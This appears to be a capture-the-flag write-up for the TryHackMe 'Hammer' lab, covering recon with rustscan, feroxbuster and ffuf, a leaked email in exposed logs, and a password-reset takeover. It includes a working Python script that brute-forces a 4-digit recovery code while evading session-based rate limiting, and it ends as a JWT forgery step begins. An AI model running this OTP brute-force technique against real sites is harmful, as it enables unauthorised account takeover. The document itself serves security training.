## Hammer

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/hammer.png)

Room Description: Use your exploitation skills to bypass authentication mechanisms on a website and get RCE.

> With the Hammer in hand, can you bypass the authentication mechanisms and get on the system?


---

## Objectives:

1. What is the flag value after logging in to the dashboard?
2. What is the content of the file /home/ubuntu/flag.txt?

---

## Adding target to hosts

```shell
sudo echo -e '10.128.136.208 hammer.thm' | sudo tee -a /etc/hosts
```

---

## Enumeration & Recon

> Rustscan results

```
rustscan -a hammer.thm --ulimit 5000 -- -sCV -O  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.128.136.208:22
Open 10.128.136.208:1337
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -O" on ip 10.128.136.208
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:f3:c1:7b:d2:c4:2c:2a:eb:90:9f:cc:4b:f6:4d:9e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMD5pyjeJ6D2flbGdw/f4CSR87rIA8EGSIJmx3NRaU2NjtDCyTcu8LonOwJuo+OPE5f1i1NTK7PkfF7QkJ6mbGpkUzPXXOG2MTLvJcgeQtrESuiCVCNXCOfS8bO8wjw0poANEpBErEeQlob+3x597VzIMOXe8hjBaK9MZ7ARi2LHQrbYAynMfo1m9dJ3DPseJ9L0hBmpNardPvFWRfbXwuQE/nRQzpl6nmZrnUOJUYamlfvKjdskb/b6icmg0HgSbJjz+lxq5ageWScX6GfB2SpozPkSKhwX5acFWxBQ0fqAeyE2OhCtsDsCA3n6cmyD8VeekUAGYmCgVLRiHHevJMSV1xvMee3pLEEwOIBV5rTIaOAceGYtE4icMmvUGj7yXhgaVjTu3yGiBttobR41BrCcdtrxOjjXgXAW0q2My+jacNd3/pzByVaNivmxwqompe3GdKpudUmhnbnzT76OxJJCR0+xkvrXMFa4Dvuw6KbY6aqRhigWDogETUXuiO5BU=
|   256 2b:27:ff:20:b3:67:20:ff:96:4e:ec:61:43:d1:2a:b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBW8yNVruMPIjVF9TDG/S3+FyHlz+YrQFXCIq7VogGA1IV4trw82hWrbHNPcw4fdMzhvon6wrhBMTYgsBJDtOyk=
|   256 c4:c5:6f:20:6a:b5:96:3f:df:ef:b9:77:fc:51:d3:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINWcY33ioAqUhw4OD0uvUngiyIVN3xMmfWFY93vFXmT/
1337/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login
```

## Directory brute force

> Feroxbuster results

```
feroxbuster -u http://hammer.thm:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hammer.thm:1337/
 🚩  In-Scope Url          │ hammer.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        6l     2304w   232914c http://hammer.thm:1337/hmr_css/bootstrap.min.css
200      GET       47l      111w     1664c http://hammer.thm:1337/reset_password.php
200      GET       36l       83w     1326c http://hammer.thm:1337/
301      GET        9l       28w      320c http://hammer.thm:1337/javascript => http://hammer.thm:1337/javascript/
301      GET        9l       28w      316c http://hammer.thm:1337/vendor => http://hammer.thm:1337/vendor/
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/autoload.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_real.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_static.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_psr4.php
200      GET       19l      168w     1068c http://hammer.thm:1337/vendor/composer/LICENSE
200      GET        0l        0w        0c http://hammer.thm:1337/vendor/composer/autoload_namespaces.php
200      GET       63l      136w     2071c http://hammer.thm:1337/vendor/composer/installed.json
200      GET      170l      650w     8697c http://hammer.thm:1337/vendor/firebase/php-jwt/CHANGELOG.md
200      GET       42l      100w     1173c http://hammer.thm:1337/vendor/firebase/php-jwt/composer.json
200      GET       30l      224w     1529c http://hammer.thm:1337/vendor/firebase/php-jwt/LICENSE
200      GET      424l     1529w    13516c http://hammer.thm:1337/vendor/firebase/php-jwt/README.md
301      GET        9l       28w      320c http://hammer.thm:1337/phpmyadmin => http://hammer.thm:1337/phpmyadmin/
301      GET        9l       28w      327c http://hammer.thm:1337/phpmyadmin/themes => http://hammer.thm:1337/phpmyadmin/themes/
301      GET        9l       28w      324c http://hammer.thm:1337/phpmyadmin/doc => http://hammer.thm:1337/phpmyadmin/doc/
301      GET        9l       28w      323c http://hammer.thm:1337/phpmyadmin/js => http://hammer.thm:1337/phpmyadmin/js/
301      GET        9l       28w      324c http://hammer.thm:1337/phpmyadmin/sql => http://hammer.thm:1337/phpmyadmin/sql/
301      GET        9l       28w      330c http://hammer.thm:1337/phpmyadmin/js/vendor => http://hammer.thm:1337/phpmyadmin/js/vendor/
301      GET        9l       28w      329c http://hammer.thm:1337/phpmyadmin/doc/html => http://hammer.thm:1337/phpmyadmin/doc/html/
301      GET        9l       28w      336c http://hammer.thm:1337/phpmyadmin/themes/original => http://hammer.thm:1337/phpmyadmin/themes/original/
301      GET        9l       28w      337c http://hammer.thm:1337/phpmyadmin/doc/html/_images => http://hammer.thm:1337/phpmyadmin/doc/html/_images/
301      GET        9l       28w      327c http://hammer.thm:1337/phpmyadmin/locale => http://hammer.thm:1337/phpmyadmin/locale/
301      GET        9l       28w      330c http://hammer.thm:1337/phpmyadmin/locale/fr => http://hammer.thm:1337/phpmyadmin/locale/fr/
301      GET        9l       28w      340c http://hammer.thm:1337/phpmyadmin/themes/original/css => http://hammer.thm:1337/phpmyadmin/themes/original/css/
```

> When I analyzed the login page source code, I noticed something: `	<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME --> `. So I started fuzzing for 'hmr_dir'

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2015-10-41.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2015-02-46.png)

```shell
ffuf -u http://hammer.thm:1337/hmr_FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hammer.thm:1337/hmr_FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 85ms]
css                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 82ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 82ms]
logs                    [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 88ms]
:: Progress: [220560/220560] :: Job [1/1] :: 511 req/sec :: Duration: [0:07:41] :: Errors: 0 ::
```

> I went for logs, and found the `http://hammer.thm/hmr_logs/error.logs` endpoint. Inside I discovered a valid email: tester@hammer.thm, and some hidden endpoints.

```text
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```

---

## Password reset via /password_reset.php endpoint: OTP Rate-Limiting Bypass

> Looks like we can reset passwords... I tried to brute force 4-digit OTP, but looks like the server applies rate limiting *BASED ON PHPSESSID*. This is important, because we are assigned a session id without authentication, and can actually get a new time if we do not have one. Each time I sent a GET request, the server just gave me a new one. Each session_id gets 8 tries and 180 seconds for successful password reset.

> Specify Email for password reset

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2015-11-00.png)

> OTP

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2015-11-08.png)


> Rate-limiting applied on current PHPSESSID

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2015-24-38.png)

> Server assigns new `PHPSESSID` when no session token is sent inside a request

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2015-26-10.png)

> So we can't just brute-force - it will not work. So I followed these steps to bypass this:

## 1. Collecting 'session_ids' to test OTP codes.

```shell
curl -sI http://hammer.thm:1337/reset_password.php | grep -oP 'PHPSESSID=[^;]+'
PHPSESSID=9ntqkdrfljrbb24olvpg2n8kgc
```

> Now let's collect 100 sessions

```shell
┌──(root㉿kali)-[~]
└─# for i in {1..100}; do curl -sI http://hammer.thm:1337/reset_password.php | grep -oP 'PHPSESSID=[^;]+' | tee -a harvest.txt; done
PHPSESSID=e4isolfbjek6mphc7kjq1bb8iu
PHPSESSID=04brjl5mqn1dipddnf0t0oisir
PHPSESSID=li45fvb9hhpp9vp19bpg0j8jau
PHPSESSID=8t88vjfiofe90qprssgir2jeck
PHPSESSID=m1t2jjpristspi6s45qciciqki
PHPSESSID=ipvu0nqgeslvg1cdqnlr32l5c7
PHPSESSID=3al166u9ql9kplruftl60n0102
PHPSESSID=43f7dkggqnlipvg5lum162dpcr
```

> Sanity check

```shell
cat harvest.txt | wc -l 
100
```


## 2. Creating a new session, then using it to test the OTP code.

> You either can use harvested sessions as a wordlist, or easier as I did, just create a new session then using it. 

```shell
python3 brute.py
[*] Starting OTP Brute Force via Python requests...
[+] Initial Session Obtained: 8hhp23d5367qhabtucq0j7q3l5
[*] Attempting Code: 1000 | PHPSESSID: f3jb7foe5dg1otqk5knf7a68d3 | Word Count: 148
============================================================
[*] SUCCESS FOUND AT INDEX 1009!
[+] Recovery Code : 1009
[+] Active Session: ukd6q6rmrfqs69771goiagmbt7
[+] Word Count   : 139
============================================================

[+] Response Body Excerpt:


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reset Password</title>
     <link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
    <script src="/hrm_js/jquery-3.6.0.min.js"></script>
            <script>
        let countdownv = 180;
        function startCountdown() {
            
            let timerElement = document.getElementById("countdown");
                        const hiddenField = document.getElementById("s");
            let interval = setInterval(function() {
                countdownv--;
                                 hiddenField.value = countdownv;
                if (countdownv <= 0) {
                    clearInterval(interval);
                                        //alert("hello");
                   window.location.href = 'logout.php'; 
                }
                timerElement.textContent = "You have " + countdownv + " seconds to enter your code.";
            }, 1000);
        }
    </script>
</head>
<body>
<di
============================================================

```


> The python script I used for the brute force

```python
#!/usr/bin/env python3
import requests

TARGET_URL = "http://hammer.thm:1337/reset_password.php"
EMAIL = "tester@hammer.thm"


def get_phpsessid(session):
    """Requests a password reset for the target email and retrieves a fresh PHPSESSID."""
    # Clear old cookies so the server is forced to issue a new session
    session.cookies.clear()

    data = {"email": EMAIL}

    try:
        resp = session.post(TARGET_URL, data=data)
        # Extract PHPSESSID from session cookies
        return session.cookies.get("PHPSESSID")
    except requests.RequestException as e:
        print(f"[-] Request error in get_phpsessid: {e}")
        return None


def submit_recovery_code(session, phpsessid, recovery_code):
    """Submits a single 4-digit recovery code bound to a specific PHPSESSID."""
    payload = {"recovery_code": recovery_code, "s": "180"}

    # Explicitly attach the session cookie
    cookies = {"PHPSESSID": phpsessid}

    try:
        resp = session.post(TARGET_URL, data=payload, cookies=cookies)
        return resp.text
    except requests.RequestException as e:
        print(f"[-] Request error submitting code {recovery_code}: {e}")
        return ""


def main():
    print("[*] Starting OTP Brute Force via Python requests...")

    # Create a persistent HTTP session pool
    s = requests.Session()

    phpsessid = get_phpsessid(s)
    if not phpsessid:
        print("[-] Failed to retrieve initial PHPSESSID. Exiting...")
        return

    print(f"[+] Initial Session Obtained: {phpsessid}")

    for i in range(10000):
        recovery_code = f"{i:04d}"  # Format index into 4-digit padded string (0000-9999)

        # Every 7th attempt, request a new session to stay below the 8-attempt lockout limit
        if i > 0 and i % 7 == 0:
            phpsessid = get_phpsessid(s)
            if not phpsessid:
                print(
                    f"[-] Failed to retrieve PHPSESSID at attempt {i}. Retrying..."
                )
                continue

        response_text = submit_recovery_code(s, phpsessid, recovery_code)
        word_count = len(response_text.split())

        # Real-time progress output every 100 iterations
        if i % 100 == 0:
            print(
                f"[*] Attempting Code: {recovery_code} | PHPSESSID: {phpsessid} | Word Count: {word_count}",
                end="\r",
            )

        # Baseline error response contains exactly 148 words. Any variance indicates success.
        if word_count != 148 and word_count > 0:
            print("\n" + "=" * 60)
            print(f"[*] SUCCESS FOUND AT INDEX {i}!")
            print(f"[+] Recovery Code : {recovery_code}")
            print(f"[+] Active Session: {phpsessid}")
            print(f"[+] Word Count   : {word_count}")
            print("=" * 60)
            print("\n[+] Response Body Excerpt:\n")
            print(response_text[:1000])
            print("=" * 60)
            break


if __name__ == "__main__":
    main()
```

> Resetting password

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2016-57-56.png)

> Logging in:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2017-02-25.png)

---

## Remote Code Execution (RCE): JWT Forgery - Sensitive Key Exposure

> At first I thought there was a blacklist or a filter which prevented some commands, but looks like it's tied to our privilege. Because I cannot execute any command except for `ls`, even with advanced shell globbing techniques I came up with. Also there's this annoying script or something that keeps you logging out of the session by setting PHPSESSID=deleted :D. So I started analyzing the requests, and it seems we have to attack the JWT for privilege escalation. Then I found this key:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2017-24-40.png)

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Medium/Hammer/Images/Screenshot%20From%202026-07-31%2017-25-46.png)

```shell
cat /home/kali/Downloads/188ade1.key 
[redacted]
```
